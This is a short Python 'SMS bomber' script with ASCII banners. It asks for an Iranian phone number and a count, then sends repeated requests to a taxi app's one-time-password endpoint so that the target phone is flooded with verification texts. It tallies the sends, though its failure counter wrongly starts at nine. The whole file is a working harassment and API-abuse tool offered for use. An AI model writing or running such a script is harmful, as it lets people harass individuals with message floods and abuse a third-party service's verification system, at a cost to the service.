from tqdm import tqdm
from colorama import Fore, init 
import requests
init(autoreset=True)

print('\033[32m' """


                                                      _    _             
                                                     | |  (_)            
      _ __   ___ _ ____   _____ ______ _ __ __ _  ___| | ___ _ __   __ _ 
     | '_ \ / _ \ '__\ \ / / _ \______| '__/ _` |/ __| |/ / | '_ \ / _` |
     | | | |  __/ |   \ V /  __/      | | | (_| | (__|   <| | | | | (_| |
     |_| |_|\___|_|    \_/ \___|      |_|  \__,_|\___|_|\_\_|_| |_|\__, |
                                                                    __/ |
                                                                   |___/  """)
print('\033[37m' """
             ____ _  _ ____    ___  ____ _  _ ___  ____ ____    
             [__  |\/| [__     |__] |  | |\/| |__] |___ |__/    
             ___] |  | ___]    |__] |__| |  | |__] |___ |  \    
 """)                                                                         
print('\033[31m' """
                          _ ____ ____ _  _ _ 
                          | |__/ |__| |\ | | 
                          | |  \ |  | | \| |

       
 
""")

phoneNumber = input("Enter phone number +98 0:")

phoneNumber = str(phoneNumber)
mydata = {"cellphone": "+98" + phoneNumber}
urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
numofmsgs = int(input("Enter number of messages to send: "))
successspamCount = 0
failspamCount = 9
for i in tqdm(range(numofmsgs)):
    resp = requests.post(urlsend, data=mydata)
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
print("Total successful messages sent: ",  successspamCount)
print("Total failed messages sent: ", failspamCount)
